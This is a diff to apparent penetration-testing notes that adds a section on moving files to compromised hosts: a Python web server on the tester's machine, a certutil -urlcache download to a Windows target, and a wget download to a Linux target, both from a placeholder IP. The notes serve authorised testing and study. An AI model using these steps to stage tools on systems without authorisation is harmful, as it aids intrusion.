@@ -169,11 +169,24 @@ upload name_of_file
 
 ```
 
-## Transfering Files
- 
+## Setting Up a Web Server with Python 
++ some time you cant use meterpreter youi need to use in built file system
++ python comes wiht SimpleHTTPServer or http.server
+```
+python -m SimpleHTTPServer 80
+python3 -m http.server 80
 
+```
 
+## Trasnfering File to WIndows Target 
+```
+certutil -urlcache -f http://IP/file_name file_name
+```
 
+## Transfering FIle to Linux 
+```
+wget http://IP/filename
+```
 
 
 
@@ -195,6 +208,9 @@ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:sbin:/bin
 export TERM=xterm
 export SHELL=bash
 ```
+
+
+
 
 
 
